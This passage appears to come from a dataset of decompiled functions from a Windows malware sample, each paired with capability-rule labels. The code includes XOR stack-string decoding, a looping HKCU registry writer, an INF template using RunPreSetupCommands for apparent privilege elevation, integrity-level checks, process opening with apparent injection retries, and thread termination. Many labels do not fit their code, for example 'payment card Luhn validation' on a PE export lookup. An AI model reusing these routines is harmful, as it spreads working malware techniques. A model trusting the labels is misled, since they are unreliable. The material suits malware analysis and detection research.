(*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar6 != 0xb6e607) {\n            *(iVar5 + iVar7) = *(&var_3ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.00408cf8();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_34h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_44h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_4ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_54h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_5ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_12ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_d4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_dch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_ech);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_7ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_fch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_114h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_13ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_11ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_124h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_134h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_e4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_f4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_104h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_10ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_cch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 19775
    },
    "0040f40a": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f40a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_5ch = 0x412b013b;\n    var_58h = 0xb1a171e;\n    var_54h = 0x15007811;\n    var_50h = 0x5a3e011a;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_60h = 0;\n    var_4ch = 0x3934020f;\n    var_48h = 0x190d5b24;\n    var_44h = 0x76111d1f;\n    var_40h = 0xb1a041c;\n    var_3ch = 0x133f4123;\n    var_38h = 0x5a241d1a;\n    var_34h = 0x212a07;\n    var_30h = 0x181b5039;\n    var_2ch = 0x666d1a0d;\n    var_28h = 0x71c020c;\n    var_24h = 0x2a1a5223;\n    var_20h = 0x50230132;\n    var_1ch = 0xa4d2a1a;\n    var_18h._0_2_ = 0x3511;\n    var_8h = 0x354d6e68;\n    var_4h._0_2_ = 0x7669;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = 6;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar2 != 0xae64fc) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_14h = 0x7e575077;\n    var_10h._0_1_ = 0x42;\n    var_8h = 0x4e676545;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x42);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_64h = 5;\n    iVar5 = 0;\n    var_ch = &var_14h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        iVar2 = var_68h;\n        if (iVar3 != 0x62731) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_64h) ^ (iVar5 + iVar4)[&var_14h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1226
    },
    "004014d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004014d9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "004014f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004014f8(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004014d9();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 354
    },
    "0040157e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040157e(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "004015e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004015e5(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0x80000000) {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 339
    },
    "0040164d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040164d(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41cb2c;\n    iVar4 = *(*(*0x41cb2c + 0x3c) + 0x80 + *0x41cb2c);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41cb2c;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.004015e5(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 428
    },
    "00401f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401f74(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 545
    },
    "0040494b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040494b(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 109
    },
    "00404965": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00404965(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 129
    },
    "0040498b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.0040498b(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x410950;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x410950;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 417
    },
    "00405d04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405d04(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "00406208": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406208(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.00401157();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 803
    },
    "00408e3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00408e3d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "0040b20b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b20b(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 521
    },
    "0040bf7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040bf7c(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41cb80), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41cb80));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 115
    },
    "0040d0d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d0d5(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x412490;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x416890;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.0040cf84();\n        if (iVar3 != 0) {\n            iVar3 = fcn.0040cf84();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00402871(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 549
    },
    "0040f6f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040f6f2(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 270
    },
    "00406ced": {
        "rules": [
            "delay execution"
        ],
